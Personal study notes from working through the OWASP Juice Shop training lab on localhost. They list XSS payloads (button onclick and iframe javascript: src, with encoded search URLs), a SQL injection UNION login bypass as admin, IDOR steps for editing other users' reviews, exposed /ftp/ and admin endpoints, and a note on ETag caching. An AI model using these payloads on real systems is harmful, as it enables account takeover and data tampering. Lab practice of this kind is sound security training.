My accounts:
test@gmail.com:r3ND4wEcZPp8wPW
test2@gmail.com:r3ND4wEcZPp8wPW

Learned stuff

```javascript 
// html injection test incase it's filtered
"><U><h1>test

// IDOR edit someone elses review
// Make a normal review, then try to edit it and catch that request
// Now there is an id value in that req, which will be replaced by an id of other user.
// That other id can be found in /products/1/reviews



```

My findings.

```javascript
// XSS HTML injection in search bar at the home page, DOM-based XSS never stored in server rather reflected in clients browser, client side js exec
<button onclick="alert('xss');">click me</button>
// also with this url
http://localhost:3000/#/search?q=<button%20onclick%3D"alert('xss');">click%20me<%2Fbutton>

Official solution
<iframe src="javascript:alert(`xss`)">
// iframe is a html tag sued to embed another document
// it executes the js as soon as it sets the iframes src
// also url
http://localhost:3000/#/search?q=<iframe%20src%3D"javascript:alert(%60xss%60)">
```

```sql
-- sql injection, login as another user with email
SELECT * FROM Users WHERE email = 'admin@juice-sh.op' UNION ALL SELECT * FROM Users;--' AND password = '3590cb8af0bbb9e78c343b52b93773c9' AND deletedAt IS NULL
-- I think the Union select grabs the Users and it so happens that the user 1 is the admin from which the email is provided for or some flawed code logic
```

```text
You can spam the chatbot to give you coupon codes
```

```shell
http://localhost:3000/ftp/
# content discovery, broken access
```

```endpoints
/rest/admin/application-configuration
```


#### Cool http thing

```http
If-None-Match: W/"7e-ZY7YwAmktldL8HbCPMPYu03ONFk"
```

This HTTP header I think works kind of like a checksum on the data that the server has stored before transmission.
So for example, if you have a document that is dynamic, on every GET request after the first one if the document hasn't changed.
You will get HTTP response code `304 not modified`.

The header, likely does a initial check so no redundant requests with "large" data are sent.
Omitting it I think causes the check to fail each time, and resend the data even if nothing changed within it.

